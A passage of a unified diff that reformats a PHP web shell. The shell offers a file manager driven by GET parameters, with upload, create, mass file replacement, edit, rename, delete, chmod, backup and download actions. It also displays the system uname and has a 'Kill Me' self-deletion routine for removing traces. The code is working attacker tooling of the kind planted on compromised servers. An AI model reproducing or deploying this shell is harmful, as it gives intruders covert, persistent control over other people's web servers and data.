-    readfile($filename);
-  
-    @readfile($filename);
-    exit(0);
-  }
+function backup($post, $filename)
+{
+    if ($_GET['do'] == $post) {
+        $file = @file_get_contents($filename);
+        $fp = @fopen($filename . ".bak", "w");
+        @fwrite($fp, $file);
+        @fclose($fp);
+    }
 }
-function backup($post, $filename) {
-  if ($_GET['do'] == $post) {
-    $file = @file_get_contents($filename);
-    $fp = @fopen($filename.".bak", "w");
-    @fwrite($fp, $file);
-    @fclose($fp);
-  }
-}
-function killme($post) {
-  if ($_GET['do'] == 'killme') {
-    $killme = unlink(@cwd() . DIRECTORY_SEPARATOR .$_SERVER['PHP_SELF']);
-    if ($killme) {
-      ?>
+function killme($post)
+{
+    if ($_GET['do'] == 'killme') {
+        $killme = unlink(@cwd() . DIRECTORY_SEPARATOR . $_SERVER['PHP_SELF']);
+        if ($killme) { ?>
       <tr>
         <td colspan="5">
-          <?php print @success("Good Bye :)") ?>
-          <?php print @home() ?>
+          <?php print @success("Good Bye :)"); ?>
+          <?php print @home(); ?>
         </td>
       </tr>
-      <?php
-      exit();
-    } else {
-      ?>
+      <?php exit();} else { ?>
       <tr>
         <td colspan="5">
-          <?php print @failed("Permission Danied") ?>
+          <?php print @failed("Permission Danied"); ?>
         </td>
       </tr>
-      <?php
-      exit();
+      <?php exit();}
     }
-  }
 }
-function home() {
-  $home = "http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."";
-  ?> <script type="text/javascript">window.location='<?php print $home ?>';</script> <?php
+function home()
+{
+    $home =
+        "http://" .
+        $_SERVER['HTTP_HOST'] .
+        $_SERVER['SCRIPT_NAME'] .
+        ""; ?> <script type="text/javascript">window.location='<?php print $home; ?>';</script> <?php
 }
-function logout($post) {
-  if ($_GET['do'] == 'logout') {
-    unset($_SESSION[@md5($_SERVER['HTTP_HOST'])]);
+function logout($post)
+{
+    if ($_GET['do'] == 'logout') {
+        unset($_SESSION[@md5($_SERVER['HTTP_HOST'])]);
+        @home();
+    }
+}
+if (isset($_GET['home'])) {
     @home();
-  }
 }
-if (isset($_GET['home']))
-{@home();}
 if ($_GET['do'] == 'delete') {
-  if (@delete($_GET['file'])) {
-    header("Location: ?".cwd()."");
-  }
+    if (@delete($_GET['file'])) {
+        header("Location: ?" . cwd() . "");
+    }
 }
 @edit("edit", $_GET['file']);
 @renames("rename", $_GET['file']);
@@ -1355,23 +1454,23 @@ if ($_GET['do'] == 'delete') {
   <thead>
     <tr>
       <th colspan="5">
-        System : <?php print @php_uname() ?>
+        System : <?php print @php_uname(); ?>
       </th>
     </tr>
     <tr>
       <th colspan="5">
-        <a class="tools" href="?path=<?php print @cwd() ?>&home">Home</a>
-        <a class="tools" href="?path=<?php print @cwd() ?>&encode">Encode</a>
-        <a class="tools" href="?path=<?php print @cwd() ?>&do=upload">Upload</a>
-        <a class="tools" href="?path=<?php print @cwd() ?>&do=making">Make File</a>
-        <a class="tools" href="?path=<?php print @cwd() ?>&do=masswrite">Replace File</a>
-        <a class="tools" href="?path=<?php print @cwd() ?>&do=killme">Kill Me</a>
-        <a class="tools" href="?path=<?php print @cwd() ?>&do=logout">Logout</a>
+        <a class="tools" href="?path=<?php print @cwd(); ?>&home">Home</a>
+        <a class="tools" href="?path=<?php print @cwd(); ?>&encode">Encode</a>
+        <a class="tools" href="?path=<?php print @cwd(); ?>&do=upload">Upload</a>
+        <a class="tools" href="?path=<?php print @cwd(); ?>&do=making">Make File</a>
+        <a class="tools" href="?path=<?php print @cwd(); ?>&do=masswrite">Replace File</a>
+        <a class="tools" href="?path=<?php print @cwd(); ?>&do=killme">Kill Me</a>
+        <a class="tools" href="?path=<?php print @cwd(); ?>&do=logout">Logout</a>
       </th>
     </tr>
     <tr>
       <th colspan="5">
-            <?php print pwd() ?> ( <?php permission(cwd(), perms(cwd())) ?> )
+            <?php print pwd(); ?> ( <?php permission(cwd(), perms(cwd())); ?> )
       </th>
     </tr>
   </thead>
@@ -1379,18 +1478,21 @@ if ($_GET['do'] == 'delete') {
 <?php
 $getPATH = @scandir(@cwd());
 foreach ($getPATH as $dir) {
-  if (!is_dir($dir) || $dir === '.' || $dir === '..') continue;
-  ?>
+    if (!is_dir($dir) || $dir === '.' || $dir === '..') {
+        continue;
+    } ?>
   <tr class="hover">
     <td class="img"> 
       <img src="https://image.flaticon.com/icons/svg/716/716784.svg" class="icon">
     </td>
     <td>
-      <a href="?path=<?php print @cwd().DIRECTORY_SEPARATOR.$dir ?>"><?php print $dir ?></a>
+      <a href="?path=<?php print @cwd() .
+          DIRECTORY_SEPARATOR .
+          $dir; ?>"><?php print $dir; ?></a>
     </td>
     <td>
       <center>
-        <?php print @permission($dir, @perms($dir)) ?>
+        <?php print @permission($dir, @perms($dir)); ?>
       </center>
     </td>
     <td>
@@ -1400,9 +1502,15 @@ foreach ($getPATH as $dir) {
       <center>
       <select style="float:right;" onclick="if (this.value) window.location=(this.value)">
         <option value="" selected>Choose . .</option>
-        <option value="?path=<?php print @cwd() ?>&do=rename&file=<?php print @cwd().DIRECTORY_SEPARATOR.$dir ?>">Rename</option>
-        <option value="?path=<?php print @cwd() ?>&do=delete&file=<?php print @cwd().DIRECTORY_SEPARATOR.$dir ?>">Delete</option>
-        <option value="?path=<?php print @cwd() ?>&do=chmod&file=<?php print  @cwd().DIRECTORY_SEPARATOR.$dir ?>">Chmod</option>
+        <option value="?path=<?php print @cwd(); ?>&do=rename&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $dir; ?>">Rename</option>
+        <option value="?path=<?php print @cwd(); ?>&do=delete&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $dir; ?>">Delete</option>
+        <option value="?path=<?php print @cwd(); ?>&do=chmod&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $dir; ?>">Chmod</option>
       </select>
     </center>
     </td>
@@ -1410,91 +1518,107 @@ foreach ($getPATH as $dir) {
   <?php
 }
 foreach ($getPATH as $file) {
-  if (!is_file($file)) continue;
-  ?>
+    if (!is_file($file)) {
+        continue;
+    } ?>
   <tr class="hover">
   <?php
-  print("<td class='img'><img src='");
+  print "<td class='img'><img src='";
   $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-  if($ext == "php"){
-    echo 'https://image.flaticon.com/icons/png/128/337/337947.png'; 
-  } elseif ($ext == "html"){
+  if ($ext == "php") {
+      echo 'https://image.flaticon.com/icons/png/128/337/337947.png';
+  } elseif ($ext == "html") {
       echo 'https://image.flaticon.com/icons/png/128/136/136528.png';
-    } elseif ($ext == "css"){
+  } elseif ($ext == "css") {
       echo 'https://image.flaticon.com/icons/png/128/136/136527.png';
-    } elseif ($ext == "png"){
+  } elseif ($ext == "png") {
       echo 'https://image.flaticon.com/icons/png/128/136/136523.png';
-    } elseif ($ext == "jpg"){
+  } elseif ($ext == "jpg") {
       echo 'https://image.flaticon.com/icons/png/128/136/136524.png';
-    } elseif ($ext == "jpeg"){
+  } elseif ($ext == "jpeg") {
       echo 'http://i.imgur.com/e8mkvPf.png"';
-    } elseif($ext == "zip"){
+  } elseif ($ext == "zip") {
       echo 'https://image.flaticon.com/icons/png/128/136/136544.png';
-    } elseif ($ext == "js"){
+  } elseif ($ext == "js") {
       echo 'https://image.flaticon.com/icons/png/128/1126/1126856.png';
-    } elseif ($ext == "ttf"){
+  } elseif ($ext == "ttf") {
       echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
-    } elseif ($ext == "otf"){
+  } elseif ($ext == "otf") {
       echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
-    } elseif ($ext == "txt"){
+  } elseif ($ext == "txt") {
       echo 'https://image.flaticon.com/icons/png/128/136/136538.png';
-    } elseif ($ext == "ico"){
+  } elseif ($ext == "ico") {
       echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
-    } elseif ($ext == "conf"){
+  } elseif ($ext == "conf") {
       echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
-    } elseif ($ext == "htaccess"){
+  } elseif ($ext == "htaccess") {
       echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
-    } elseif ($ext == "sh"){
+  } elseif ($ext == "sh") {
       echo 'https://image.flaticon.com/icons/png/128/617/617535.png';
-    } elseif ($ext == "py"){
+  } elseif ($ext == "py") {
       echo 'https://image.flaticon.com/icons/png/128/180/180867.png';
-    } elseif ($ext == "indsc"){
+  } elseif ($ext == "indsc") {
       echo 'https://image.flaticon.com/icons/png/512/1265/1265511.png';
-    } elseif ($ext == "sql"){
+  } elseif ($ext == "sql") {
       echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
-    } elseif ($ext == "pl"){
+  } elseif ($ext == "pl") {
       echo 'http://i.imgur.com/PnmX8H9.png';
-    } elseif ($ext == "pdf"){
+  } elseif ($ext == "pdf") {
       echo 'https://image.flaticon.com/icons/png/128/136/136522.png';
-    } elseif ($ext == "mp4"){
+  } elseif ($ext == "mp4") {
       echo 'https://image.flaticon.com/icons/png/128/136/136545.png';
-    } elseif ($ext == "mp3"){
+  } elseif ($ext == "mp3") {
       echo 'https://image.flaticon.com/icons/png/128/136/136548.png';
-    } elseif ($ext == "git"){
+  } elseif ($ext == "git") {
       echo 'https://image.flaticon.com/icons/png/128/617/617509.png';
-    } elseif ($ext == "md"){echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
+  } elseif ($ext == "md") {
+      echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
   } else {
-    echo 'https://image.flaticon.com/icons/svg/833/833524.svg';
-  } print("' class='icon'></img></td>");
-  if (strlen($file) > 25){
-    $_file = substr($file, 0, 25)."...-.".$ext;                       
+      echo 'https://image.flaticon.com/icons/svg/833/833524.svg';
+  }
+  print "' class='icon'></img></td>";
+  if (strlen($file) > 25) {
+      $_file = substr($file, 0, 25) . "...-." . $ext;
   } else {
-    $_file = $file;          }
+      $_file = $file;
+  }
   ?>
     <td>
-      <?php print $file ?>
+      <?php print $file; ?>
     </td>
     </td>
     <td>
       <center>
-        <?php print @permission($file, @perms($file)) ?>
+        <?php print @permission($file, @perms($file)); ?>
       </center>
     </td>
     <td>
       <center>
-        <?php print @size($file) ?>
+        <?php print @size($file); ?>
       </center>
     </td>
     <td>
       <center>
         <select style="float:right;" onclick="if (this.value) window.location=(this.value)">
         <option value="" selected>Choose . .</option>
-        <option value="?path=<?php print @cwd() ?>&do=edit&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Edit</option>
-        <option value="?path=<?php print @cwd() ?>&do=rename&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Rename</option>
-        <option value="?path=<?php print @cwd() ?>&do=delete&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Delete</option>
-        <option value="?path=<?php print @cwd() ?>&do=chmod&file=<?php print  @cwd().DIRECTORY_SEPARATOR.$file ?>">Chmod</option>
-        <option value="?path=<?php print @cwd() ?>&do=backup&file=<?php print  @cwd().DIRECTORY_SEPARATOR.$file ?>">Backup</option>
-        <option value="?path=<?php print @cwd() ?>&do=download&file=<?php print  @cwd().DIRECTORY_SEPARATOR.$file ?>">Download</option>
+        <option value="?path=<?php print @cwd(); ?>&do=edit&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $file; ?>">Edit</option>
+        <option value="?path=<?php print @cwd(); ?>&do=rename&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $file; ?>">Rename</option>
+        <option value="?path=<?php print @cwd(); ?>&do=delete&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $file; ?>">Delete</option>
+        <option value="?path=<?php print @cwd(); ?>&do=chmod&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $file; ?>">Chmod</option>
+        <option value="?path=<?php print @cwd(); ?>&do=backup&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $file; ?>">Backup</option>
+        <option value="?path=<?php print @cwd(); ?>&do=download&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $file; ?>">Download</option>
       </select>
       </center>
     </center>
